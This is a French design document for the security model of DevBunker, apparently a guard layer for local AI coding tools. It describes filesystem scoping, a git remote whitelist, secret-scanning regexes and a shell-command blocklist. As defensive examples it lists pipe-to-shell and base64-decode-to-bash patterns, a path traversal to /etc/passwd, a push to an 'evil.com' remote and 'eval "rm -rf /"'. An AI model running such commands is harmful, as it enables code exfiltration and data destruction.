# DevBunker - Modèle de sécurité

## 1. Philosophie

DevBunker applique une **défense en profondeur applicative**. Il ne remplace pas
la sécurité au niveau OS/réseau mais ajoute une couche de protection intelligente
adaptée au contexte du développement assisté par IA.

```
Niveau 4 : Réseau OS/Firewall     ← Hors scope DevBunker (responsabilité utilisateur)
Niveau 3 : DevBunker Guards        ← CE DOCUMENT
Niveau 2 : Permissions utilisateur ← OS standard
Niveau 1 : Modèle local           ← Pas de fuite vers un cloud IA
```

## 2. Menaces adressées

| Menace                              | Protection DevBunker                    |
|-------------------------------------|-----------------------------------------|
| Fuite de code vers un LLM cloud     | Provider lock (local uniquement)        |
| Exfiltration de code via git push   | Git Guard (remote whitelist)            |
| Fuite de secrets dans un commit     | Secret scan pre-push                    |
| Accès fichiers hors workspace       | Filesystem Scope                        |
| Exécution de commandes dangereuses  | Shell Guard (whitelist/confirm/block)   |
| Modification de config globale git  | Blocage de git config --global          |
| Push force destructif               | Blocage de git push --force             |

## 3. Menaces NON adressées (limites)

| Menace                                    | Pourquoi non couvert                    |
|-------------------------------------------|-----------------------------------------|
| Script Python/Node avec appels réseau     | Impossible à détecter statiquement      |
| Exfiltration via DNS ou canaux cachés     | Nécessite contrôle réseau OS            |
| Attaque du modèle local (prompt injection)| Inhérent aux LLMs, pas spécifique       |
| Compromission de la machine hôte          | Hors scope (sécurité OS)               |
| Supply chain (paquets npm/pip malveillants)| Hors scope (audit de dépendances)      |

**Recommandation** : En environnement haute sécurité (défense, etc.), DevBunker
doit être utilisé sur une machine **physiquement air-gappée** ou avec un firewall
configuré pour bloquer tout trafic sortant sauf les destinations autorisées.

## 4. Filesystem Scope — Détails d'implémentation

### Vérification de chemin

```
Entrée utilisateur : "../../../etc/passwd"
    │
    ▼
Résolution absolue : path.resolve(workspace, userPath)
    │
    ▼
Résultat : "/etc/passwd"
    │
    ▼
Vérification : startsWith(workspaceRoot) ?
    │
    ├── NON → BLOQUÉ + log
    └── OUI → Continuer
           │
           ▼
       Vérification symlink : fs.realpath()
           │
           ▼
       Le chemin réel est dans le workspace ?
           │
           ├── NON → BLOQUÉ + log
           └── OUI → AUTORISÉ
```

### Fichiers sensibles dans le workspace

Même à l'intérieur du workspace, certains fichiers déclenchent un avertissement :

| Pattern              | Action         | Raison                         |
|----------------------|----------------|--------------------------------|
| `.env`, `.env.*`     | Avertissement  | Contient souvent des secrets   |
| `*.pem`, `*.key`     | Avertissement  | Clés cryptographiques          |
| `*.p12`, `*.pfx`     | Avertissement  | Certificats                    |
| `id_rsa`, `id_ed25519` | Bloqué       | Clés SSH privées               |
| `*.sqlite`, `*.db`   | Normal         | Bases locales (légitime)       |

## 5. Git Guard — Détails d'implémentation

### Algorithme de vérification remote

```
Commande git interceptée
    │
    ▼
Est-ce une opération distante ? (push, remote add, remote set-url)
    │
    ├── NON → AUTORISÉ (opération locale)
    └── OUI
         │
         ▼
     Extraire l'URL remote cible
         │
         ▼
     Matcher contre la whitelist (glob matching)
         │
         ├── Match trouvé
         │       │
         │       ▼
         │   Est-ce un push --force ?
         │       │
         │       ├── OUI + blockForce=true → BLOQUÉ
         │       └── NON → Lancer le secret scan
         │                    │
         │                    ├── Secrets détectés → BLOQUÉ + détail
         │                    └── Propre → AUTORISÉ
         │
         └── Pas de match
                 │
                 ▼
             BLOQUÉ : "Remote non autorisé"
             + Afficher la whitelist configurée
             + Proposer d'ajouter le remote à la whitelist
```

### Patterns de secrets détectés

```
# Clés API cloud
AWS_ACCESS_KEY    : AKIA[0-9A-Z]{16}
GitHub Token      : ghp_[a-zA-Z0-9]{36}
GitLab Token      : glpat-[a-zA-Z0-9\-]{20}
Slack Token       : xox[bpors]-[a-zA-Z0-9-]+
OpenAI Key        : sk-[a-zA-Z0-9]{48}
Anthropic Key     : sk-ant-[a-zA-Z0-9\-]{40,}
Stripe Key        : sk_live_[a-zA-Z0-9]{24,}
Google API Key    : AIza[0-9A-Za-z\-_]{35}

# Secrets génériques
Private Key       : -----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----
JWT               : eyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*
Password in URL   : ://[^:]+:[^@]+@
Generic Secret    : (password|secret|token|apikey)\s*[:=]\s*['"][^'"]{8,}['"]
```

## 6. Shell Guard — Détails d'implémentation

### Algorithme de classification

```
Commande reçue
    │
    ▼
Parsing : extraire le binaire principal + arguments
    │
    ▼
Le binaire est dans la BLOCKLIST ?
    │
    ├── OUI → BLOQUÉ + explication
    └── NON
         │
         ▼
     Le binaire est dans la WHITELIST ?
         │
         ├── OUI → Vérifier le working directory
         │            │
         │            ├── Dans le workspace → AUTORISÉ
         │            └── Hors workspace → BLOQUÉ
         │
         └── NON
              │
              ▼
          Le binaire est dans la CONFIRMLIST ?
              │
              ├── OUI → Demander confirmation utilisateur
              │            │
              │            ├── Confirmé → EXÉCUTER
              │            └── Refusé → ANNULÉ
              │
              └── NON → Commande inconnue
                          │
                          ▼
                      Demander confirmation utilisateur
                      (avec avertissement "commande non classifiée")
```

### Détection de contournement

Les patterns suivants dans une commande déclenchent un blocage :

```
# Pipes vers un shell
... | sh
... | bash
... | zsh
... | cmd
... | powershell

# Eval/exec
eval "..."
exec "..."
bash -c "..."
sh -c "..."
python -c "import os; os.system('...')"
node -e "require('child_process').exec('...')"

# Encodage/obfuscation
base64 -d | sh
echo "..." | base64 -d | bash
```

**Note** : Cette détection est best-effort. Un attaquant sophistiqué peut
contourner ces vérifications. Le Shell Guard est une protection contre les
erreurs et les comportements non intentionnels du LLM, pas contre un
adversaire déterminé.

## 7. Logging et audit

Toutes les opérations des guards sont loguées :

```
[GUARD:FS]    ALLOW  Read  /workspace/src/main.ts
[GUARD:FS]    BLOCK  Read  /etc/passwd (hors workspace)
[GUARD:GIT]   ALLOW  push  origin → git@github.com:org/repo.git
[GUARD:GIT]   BLOCK  push  evil-remote → git@evil.com:steal/code.git
[GUARD:GIT]   BLOCK  secret detected: AWS key in src/config.ts:42
[GUARD:SHELL] ALLOW  npm test
[GUARD:SHELL] CONFIRM curl https://example.com → user: YES
[GUARD:SHELL] BLOCK  ssh user@remote (commande bloquée)
[GUARD:SHELL] BLOCK  eval "rm -rf /" (contournement détecté)
```

Les logs sont stockés dans le dossier `.devbunker/logs/` du workspace
et peuvent être consultés pour audit.
